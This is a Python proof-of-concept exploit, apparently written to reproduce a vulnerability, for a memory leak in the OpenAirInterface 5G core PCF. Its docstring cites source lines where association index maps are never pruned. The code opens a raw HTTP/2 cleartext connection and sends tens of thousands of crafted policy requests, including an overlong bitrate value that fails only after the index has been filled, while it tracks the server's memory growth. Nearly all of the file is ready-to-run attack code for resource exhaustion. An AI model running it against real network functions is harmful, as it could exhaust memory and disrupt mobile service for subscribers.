#!/usr/bin/env python3
"""
OAI CN5G PCF -- cand-oai-pcf-04: `policy_storage_yaml` association index maps are
NEVER pruned -> unbounded RSS growth (CWE-401 Missing Release of Memory -> CWE-400
Uncontrolled Resource Consumption).

VULNERABLE CODE (oai-pcf @ develop 11c3ed4, yaml storage backend):
  src/pcf_app/sm_policy/policy_storage_yaml.hpp:74,113  "// TODO methods to update and
        delete" -- the class exposes NO delete/remove API at all.
  src/pcf_app/sm_policy/policy_storage_yaml.cpp:167  assocs->second.push_back(association_id);
        (m_dnn_to_association_map[dnn] grows by one heap string PER REQUEST, same DNN included)
  src/pcf_app/sm_policy/policy_storage_yaml.cpp:144,152  m_ip_to_association_map.insert /
        m_supi_to_association_map.insert  (keyed by CLIENT-SUPPLIED ipv4/supi -> distinct
        attacker-chosen values grow both maps without bound)
  src/pcf_app/pcf_sm_policy_control.cpp:505  insert_associations(context, association_id)
        runs BEFORE the success check at :507 and BEFORE the to_bps() throw at :520, so the
        index is polluted even for requests that ultimately fail with HTTP 400.
  src/pcf_app/pcf_sm_policy_control.cpp:589,593  delete only does m_associations.erase();
        "// TODO [PAS]: Perform session binding delete" -- the storage index is never pruned.

Because nothing ever removes an index entry, each request permanently retains ~3 small heap
nodes (dnn-vector element + supi-map node + ip-map node). Measured permanent residue on this
lane: ~107 bytes/request that is NEVER reclaimed (vs ~11.5 kB/request for a live association,
which IS freed on delete).

THREE MODES (the differential isolates the leak):
  errorpath     : N x POST /sm-policies with subsSessAmbr.uplink="1.999...(23 nines)...Mbps".
                  The >19-digit fraction makes bitrate::to_bps() throw std::out_of_range at
                  qos_session_authorization.cpp:520 -- AFTER insert_associations() at :505.
                  => HTTP 400, but the yaml index IS polluted and no association is retained.
  control       : N x POST /sm-policies MISSING the mandatory "dnn". SmPolicyContextData
                  validation fails at the HTTP layer => HTTP 400 BEFORE create_sm_policy_handler
                  => insert_associations() never runs => index does NOT grow.
  IDENTICAL HTTP 400 for errorpath vs control, but only errorpath leaks: this isolates the
  un-pruned index as the sole cause of the RSS climb (no association-state confound).
  valid_delete  : C cycles x (M valid POST [201] + M delete [204]). After every cycle all
                  associations are deleted (m_associations drained) yet the post-delete RSS
                  ratchets UP cycle-over-cycle == the index residue that delete never reclaims.

Transport: SBI is HTTP/2 cleartext (h2c prior-knowledge, nghttp2). httpx does NOT do h2c
prior-knowledge (it falls back to HTTP/1.1 and the server drops it), so this PoC drives a
raw `h2` connection over a socket, reusing one connection for the whole run.

Usage:
  ./oai_yamlindex_leak_poc.py --mode errorpath --target 127.0.0.1:18080 -n 30000 \
        --evidence-dir . [--sample-every 2000] [--container oai-pcf]
  ./oai_yamlindex_leak_poc.py --mode valid_delete --cycles 5 --per-cycle 4000 ...
Exit: 0 = leak reproduced for the mode; 1 = not reproduced; 2 = transport/setup error.
"""
import argparse
import csv
import json
import os
import socket
import subprocess
import sys
import time

import h2.config
import h2.connection
import h2.events

ROUTE = "/npcf-smpolicycontrol/v1/sm-policies"
LONGFRAC = "1.99999999999999999999999 Mbps"  # 23 nines -> stoull throws out_of_range


# ------------------------------- h2c client ---------------------------------
class H2C:
    def __init__(self, host, port, timeout=30):
        self.host, self.port, self.timeout = host, port, timeout
        self._connect()

    def _connect(self):
        self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        self.sock.settimeout(self.timeout)
        cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
        self.conn = h2.connection.H2Connection(config=cfg)
        self.conn.initiate_connection()
        self._flush()

    def _flush(self):
        d = self.conn.data_to_send()
        if d:
            self.sock.sendall(d)

    def request(self, method, path, body=None, _retries=3):
        data = b"" if body is None else (body if isinstance(body, bytes) else body.encode())
        for attempt in range(_retries):
            try:
                return self._request_once(method, path, data)
            except (socket.error, OSError, h2.exceptions.H2Error, ConnectionError) as exc:
                if attempt == _retries - 1:
                    raise
                try:
                    self.sock.close()
                except OSError:
                    pass
                time.sleep(0.3)
                self._connect()
        raise RuntimeError("unreachable")

    def _request_once(self, method, path, data):
        sid = self.conn.get_next_available_stream_id()
        hdrs = [(":method", method), (":path", path), (":scheme", "http"),
                (":authority", f"{self.host}:{self.port}")]
        if data:
            hdrs += [("content-type", "application/json"), ("content-length", str(len(data)))]
        self.conn.send_headers(sid, hdrs)
        if data:
            while True:  # respect flow control
                try:
                    self.conn.send_data(sid, data, end_stream=True)
                    break
                except h2.exceptions.FlowControlError:
                    self._pump_until_window()
        else:
            self.conn.end_stream(sid)
        self._flush()
        status, rheaders, rdata, ended = None, {}, b"", False
        while not ended:
            raw = self.sock.recv(65535)
            if not raw:
                break
            for e in self.conn.receive_data(raw):
                if isinstance(e, h2.events.ResponseReceived) and e.stream_id == sid:
                    rheaders = dict(e.headers)
                    status = rheaders.get(":status")
                elif isinstance(e, h2.events.DataReceived) and e.stream_id == sid:
                    rdata += e.data
                    self.conn.acknowledge_received_data(e.flow_controlled_length, e.stream_id)
                elif isinstance(e, (h2.events.StreamEnded, h2.events.StreamReset)) and e.stream_id == sid:
                    ended = True
            self._flush()
        return status, rheaders, rdata

    def _pump_until_window(self):
        self._flush()
        raw = self.sock.recv(65535)
        if raw:
            self.conn.receive_data(raw)
        self._flush()

    def close(self):
        try:
            self.conn.close_connection()
            self._flush()
            self.sock.close()
        except Exception:  # noqa: BLE001
            pass


# ------------------------------- helpers ------------------------------------
def rss_kb(container):
    out = subprocess.run(["docker", "exec", container, "sh", "-c", "grep VmRSS /proc/1/status"],
                         capture_output=True, text=True).stdout
    digs = [t for t in out.split() if t.isdigit()]
    return int(digs[0]) if digs else -1


def valid_body(supi, psi):
    return json.dumps({"supi": supi, "pduSessionId": psi, "pduSessionType": "IPV4", "dnn": "oai",
                       "sliceInfo": {"sst": 1, "sd": "000001"},
                       "notificationUri": "http://127.0.0.1:9999/notify",
                       "subsSessAmbr": {"uplink": "50 Mbps", "downlink": "50 Mbps"}})


def errorpath_body(supi, psi):
    return json.dumps({"supi": supi, "pduSessionId": psi, "pduSessionType": "IPV4", "dnn": "oai",
                       "sliceInfo": {"sst": 1, "sd": "000001"},
                       "notificationUri": "http://127.0.0.1:9999/notify",
                       "subsSessAmbr": {"uplink": LONGFRAC, "downlink": "50 Mbps"}})


def control_body(supi, psi):  # missing mandatory "dnn" -> 400 before insert_associations
    return json.dumps({"supi": supi, "pduSessionId": psi, "pduSessionType": "IPV4",
                       "sliceInfo": {"sst": 1, "sd": "000001"},
                       "subsSessAmbr": {"uplink": "50 Mbps", "downlink": "50 Mbps"}})


def delete_body(supi, psi):
    return json.dumps({"supi": supi, "pduSessionId": psi,
                       "notificationUri": "http://127.0.0.1:9999/notify"})


def supi_for(base, i):
    return f"imsi-{base + i}"


def run_flat(client, mode, n, sample_every, container, ev, base_supi):
    """errorpath / control: fire n requests, sample RSS periodically."""
    mk = errorpath_body if mode == "errorpath" else control_body
    baseline = rss_kb(container)
    print(f"[{mode}] baseline RSS = {baseline} kB; firing {n} requests "
          f"(sample every {sample_every})")
    codes, rows, t0 = {}, [], time.time()
    csv_path = os.path.join(ev, "rss_series.csv")
    with open(csv_path, "w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["req_index", "http_code_counts", "rss_kb", "rss_delta_kb", "elapsed_s"])
        w.writerow([0, "{}", baseline, 0, 0.0])
        for i in range(1, n + 1):
            psi = 1 + (i % 15)  # pduSessionId MUST be 1..15 (<=255, else parse-rejected pre-handler); supi varies -> index grows
            status, _, _ = client.request("POST", ROUTE, mk(supi_for(base_supi, i), psi))
            codes[status] = codes.get(status, 0) + 1
            if i % sample_every == 0 or i == n:
                r = rss_kb(container)
                row = [i, json.dumps(codes), r, r - baseline, round(time.time() - t0, 1)]
                w.writerow(row)
                rows.append(row)
                print(f"  [{mode}] req {i:>7}  codes={codes}  RSS {r} kB (delta {r-baseline:+d})  "
                      f"{row[4]}s")
    final = rss_kb(container)
    delta = final - baseline
    return {"mode": mode, "n": n, "baseline_rss_kb": baseline, "final_rss_kb": final,
            "delta_rss_kb": delta, "http_codes": codes, "series": rows,
            "per_req_bytes": round(delta * 1024 / n, 1) if n else 0,
            "elapsed_s": round(time.time() - t0, 1)}


def run_valid_delete(client, cycles, per_cycle, container, ev, base_supi):
    """valid_delete: C cycles of (M POST[201] + M delete[204]); post-delete RSS must ratchet up."""
    baseline = rss_kb(container)
    print(f"[valid_delete] baseline RSS = {baseline} kB; {cycles} cycles x {per_cycle} POST+DELETE")
    rows, t0, off = [], time.time(), 0
    total_posts = total_dels = 0
    csv_path = os.path.join(ev, "rss_series.csv")
    with open(csv_path, "w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["cycle", "posts_201", "deletes_ok_204", "rss_after_delete_kb",
                    "residual_delta_kb", "elapsed_s"])
        w.writerow([0, 0, 0, baseline, 0, 0.0])
        for c in range(1, cycles + 1):
            ids, posts = [], {}
            for i in range(per_cycle):
                off += 1
                supi = supi_for(base_supi, off)
                psi = 1 + (off % 15)
                status, hdrs, _ = client.request("POST", ROUTE, valid_body(supi, psi))
                posts[status] = posts.get(status, 0) + 1
                if status == "201":
                    aid = hdrs.get("location", "").rstrip("/").split("/")[-1]
                    if aid:
                        ids.append((aid, supi, psi))
            # delete every association we just created: this drains m_associations
            # (delete_sm_policy_handler :589) but NEVER prunes the yaml index (:593 TODO),
            # so the post-delete RSS is the pure un-reclaimed index residue.
            dels = {}
            for (aid, supi, psi) in ids:
                status, _, _ = client.request("POST", f"{ROUTE}/{aid}/delete", delete_body(supi, psi))
                dels[status] = dels.get(status, 0) + 1
            # delete_sm_policy_handler returns 204 No Content on success (NOT 200)
            dels_ok = dels.get("204", 0) + dels.get("200", 0)
            total_posts += posts.get("201", 0)
            total_dels += dels_ok
            rss_after = rss_kb(container)
            residual = rss_after - baseline
            row = [c, posts.get("201", 0), dels_ok, rss_after, residual,
                   round(time.time() - t0, 1)]
            w.writerow(row)
            rows.append(row)
            print(f"  [valid_delete] cycle {c}: posts={posts} dels={dels} RSS_after={rss_after} kB "
                  f"(residual {residual:+d})  {row[5]}s")
    final = rss_kb(container)
    resid = [r[4] for r in rows]
    monotonic = all(resid[i] <= resid[i + 1] for i in range(len(resid) - 1))
    return {"mode": "valid_delete", "cycles": cycles, "per_cycle": per_cycle,
            "baseline_rss_kb": baseline, "final_rss_kb": final, "delta_rss_kb": final - baseline,
            "residual_series_kb": resid, "monotonic_ratchet": monotonic,
            "total_posts_201": total_posts, "total_deletes_ok_204": total_dels,
            "elapsed_s": round(time.time() - t0, 1)}


def main():
    ap = argparse.ArgumentParser(description="OAI PCF yaml-index leak PoC (cand-oai-pcf-04)")
    ap.add_argument("--mode", choices=["errorpath", "control", "valid_delete"], default="errorpath")
    ap.add_argument("--target", default="127.0.0.1:18080")
    ap.add_argument("-n", "--requests", type=int, default=30000)
    ap.add_argument("--cycles", type=int, default=5)
    ap.add_argument("--per-cycle", type=int, default=4000)
    ap.add_argument("--sample-every", type=int, default=2000)
    ap.add_argument("--container", default="oai-pcf")
    ap.add_argument("--base-supi", type=int, default=208950000000000)
    ap.add_argument("--evidence-dir", default=".")
    # errorpath/control grow the index monotonically; distinct supi bases per run keep the
    # supi-map keys unique across runs so nothing is deduped.
    ap.add_argument("--supi-offset", type=int, default=0)
    args = ap.parse_args()

    ev = args.evidence_dir
    os.makedirs(ev, exist_ok=True)
    host, _, port = args.target.partition(":")
    base_supi = args.base_supi + args.supi_offset
    try:
        client = H2C(host, int(port))
    except OSError as exc:
        print(f"[!] cannot connect to {args.target}: {exc}", file=sys.stderr)
        return 2

    t0 = time.time()
    if args.mode in ("errorpath", "control"):
        res = run_flat(client, args.mode, args.requests, args.sample_every, args.container, ev, base_supi)
        delta = res["delta_rss_kb"]
        if args.mode == "errorpath":
            ok = delta >= 1500 and res["http_codes"].get("400", 0) > args.requests * 0.9
            res["verdict"] = "REPRODUCED" if ok else "NOT_REPRODUCED"
            res["criteria"] = "delta_rss_kb>=1500 and >90% HTTP 400 (index polluted on error path)"
        else:
            ok = delta < 1200 and res["http_codes"].get("400", 0) > args.requests * 0.9
            res["verdict"] = "FLAT_AS_EXPECTED" if ok else "UNEXPECTED_GROWTH"
            res["criteria"] = "delta_rss_kb<1200 and >90% HTTP 400 (rejected pre-insert, no growth)"
    else:
        res = run_valid_delete(client, args.cycles, args.per_cycle, args.container, ev, base_supi)
        dels_ok = res["total_deletes_ok_204"] >= res["total_posts_201"] * 0.9
        ok = res["monotonic_ratchet"] and res["delta_rss_kb"] >= 1500 and dels_ok
        res["verdict"] = "REPRODUCED" if ok else "NOT_REPRODUCED"
        res["criteria"] = ("post-delete residual ratchets up monotonically, delta>=1500 kB, and "
                           ">=90% of created associations deleted (204) so the residue is post-delete")
    client.close()
    res["target"] = args.target
    res["wall_s"] = round(time.time() - t0, 1)

    with open(os.path.join(ev, "poc_summary.json"), "w") as fh:
        json.dump(res, fh, indent=2)
    with open(os.path.join(ev, "verdict.txt"), "w") as fh:
        fh.write(f"mode={args.mode}\nverdict={res['verdict']}\ncriteria={res.get('criteria')}\n"
                 f"delta_rss_kb={res['delta_rss_kb']}\nbaseline_rss_kb={res['baseline_rss_kb']}\n"
                 f"final_rss_kb={res['final_rss_kb']}\nhttp_codes={res.get('http_codes')}\n"
                 f"per_req_bytes={res.get('per_req_bytes')}\n"
                 f"total_posts_201={res.get('total_posts_201')}\n"
                 f"total_deletes_ok_204={res.get('total_deletes_ok_204')}\nwall_s={res['wall_s']}\n")
    print("\n" + "=" * 72)
    print(f"MODE={args.mode}  VERDICT={res['verdict']}  "
          f"RSS {res['baseline_rss_kb']}->{res['final_rss_kb']} kB (delta {res['delta_rss_kb']:+d})")
    print("=" * 72)
    return 0 if res["verdict"] in ("REPRODUCED", "FLAT_AS_EXPECTED") else 1


if __name__ == "__main__":
    sys.exit(main())
